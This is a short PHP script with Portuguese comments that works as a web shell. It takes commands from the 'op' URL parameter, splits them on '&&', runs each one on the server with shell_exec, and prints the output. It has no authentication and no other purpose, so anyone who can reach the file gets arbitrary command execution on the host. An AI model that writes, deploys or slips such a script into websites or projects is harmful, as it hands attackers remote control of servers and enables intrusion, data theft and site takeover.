<?php
if (isset($_GET['op'])) {
    $commands = explode('&&', $_GET['op']);
    $output = '';

    foreach ($commands as $command) {
        $command = trim($command);

        // Executar o comando no sistema operacional
        $output .= shell_exec($command) . "\n";
    }

    // Mostrar a saída dos comandos
    echo "<pre>$output</pre>";
} else {
    echo "Nenhum comando especificado.";
}
?>
